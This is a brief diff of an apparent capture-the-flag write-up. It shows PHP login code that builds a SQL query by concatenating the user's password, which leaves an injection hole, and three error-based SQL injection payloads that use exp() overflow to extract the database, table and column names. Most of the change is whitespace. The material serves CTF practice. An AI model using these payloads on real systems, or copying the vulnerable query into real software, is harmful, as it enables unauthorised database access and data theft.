@@ -24,7 +24,8 @@ $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($pass
 $result=mysqli_query($link,$sql);
 	if(mysqli_num_rows($result)>0){
 		echo 'flag is :'.$flag;
-	}
+    }
+    
 	else{
 		echo '密码错误!';
 	}
@@ -67,10 +68,6 @@ true
 username=123&password=1'||exp(~(select * from(select database())a))||'0   #error_based_hpf
 username=123&password=1'||exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema in('error_based_hpf'))a))||'0  #ffll44jj,users
 username=123&password=1'||exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name in('ffll44jj'))a))||'0   #value
-
-
-
-
 ```
 
 <br>
